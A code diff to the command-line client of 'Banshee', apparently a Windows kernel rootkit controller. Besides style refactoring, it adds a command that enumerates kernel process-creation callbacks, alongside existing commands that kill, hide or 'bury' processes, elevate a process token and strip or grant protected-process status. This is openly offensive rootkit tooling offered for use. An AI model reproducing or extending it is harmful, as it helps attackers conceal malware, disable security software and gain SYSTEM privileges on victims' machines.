@@ -24,9 +24,9 @@ main(INT argc, CHAR *argv[])
         LogError("Please specify the driver location");
         return 1;
     }
-    Banshee banshee = Banshee();
-
+    auto banshee = Banshee();
     std::string driverPath = argv[1];
+
     BANSHEE_STATUS BeStatus = banshee.Install(driverPath);
 
     LogInfo("Installing driver if not already installed...");
@@ -42,7 +42,6 @@ main(INT argc, CHAR *argv[])
         }
         return 1;
     }
-
     LogInfo("Loading driver...");
     if (banshee.Initialize() != BE_SUCCESS)
     {
@@ -52,13 +51,13 @@ main(INT argc, CHAR *argv[])
 
     // Main Loop
 
-    bool shouldExit = false;
+    BOOL shouldExit = false;
     while (!shouldExit)
     {
         BANSHEE_STATUS status = BE_ERR_GENERIC;
 
-        std::string choice = AskInput("");
-        std::string::iterator end_pos = std::remove(choice.begin(), choice.end(), ' '); // strip spaces from commands
+        auto choice = AskInput("");
+        auto end_pos = std::remove(choice.begin(), choice.end(), ' '); // strip spaces from commands
         choice.erase(end_pos, choice.end());
 
         if (choice == "help")
@@ -70,6 +69,7 @@ main(INT argc, CHAR *argv[])
             printf("    hide      - Hide a process from task manager etc. by PID\n");
             printf("    unprotect - remove protection from process by PID\n");
             printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
+            printf("    callbacks - enumerate kernel callbacks\n");
             printf("    test      - test driver\n");
             printf("    load      - load driver from path\n");
             printf("    unload    - unload driver\n");
@@ -87,7 +87,7 @@ main(INT argc, CHAR *argv[])
         }
         else if (choice == "load")
         {
-            std::string pathToDriver = AskInputNoPrompt("Path to driver: ");
+            auto pathToDriver = AskInputNoPrompt("Path to driver: ");
             status = banshee.Install(pathToDriver);
             if (status == BE_SUCCESS)
             {
@@ -100,15 +100,15 @@ main(INT argc, CHAR *argv[])
         }
         else if (choice == "kill")
         {
-            int targetPid = getIntFromUser("Target pid: ");
+            INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlKillProcess(targetPid);
         }
         else if (choice == "bury")
         {
-            std::string processToBury = AskInputNoPrompt("Target process (substring to match image path, spaces will be stripped): ");
+            auto processToBury = AskInputNoPrompt("Target process (substring to match image path, spaces will be stripped): ");
 
             // strip spaces
-            std::string::iterator end_pos = std::remove(processToBury.begin(), processToBury.end(), ' '); 
+            auto end_pos = std::remove(processToBury.begin(), processToBury.end(), ' '); 
             processToBury.erase(end_pos, processToBury.end());
 
             LogInfo("Attempting to bury " + processToBury);
@@ -116,23 +116,38 @@ main(INT argc, CHAR *argv[])
         }
         else if (choice == "elevate")
         {
-            int targetPid = getIntFromUser("Target pid: ");
+            INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlElevateProcessAccessToken(targetPid);
         }
         else if (choice == "hide")
         {
-            int targetPid = getIntFromUser("Target pid: ");
+            INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlHideProcess(targetPid);
         }
         else if (choice == "unprotect")
         {
-            int targetPid = getIntFromUser("Target pid: ");
+            INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_NONE);
         }
         else if (choice == "protect")
         {
-            int targetPid = getIntFromUser("Target pid: ");
+            INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_SYSTEM);
+        }
+        else if (choice == "callbacks")
+        {
+            auto callbackData = std::vector<CALLBACK_DATA>();
+            status = banshee.IoCtlEnumerateCallbacks(callbackData);
+            if (status != BE_SUCCESS)
+            {
+                LogError("Banshee Error: " + std::to_string((INT)status));
+                continue;
+            }
+            LogInfo("Enumerating process creation callbacks");
+            for (auto e : callbackData)
+            {
+                printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
+            }
         }
         else
         {
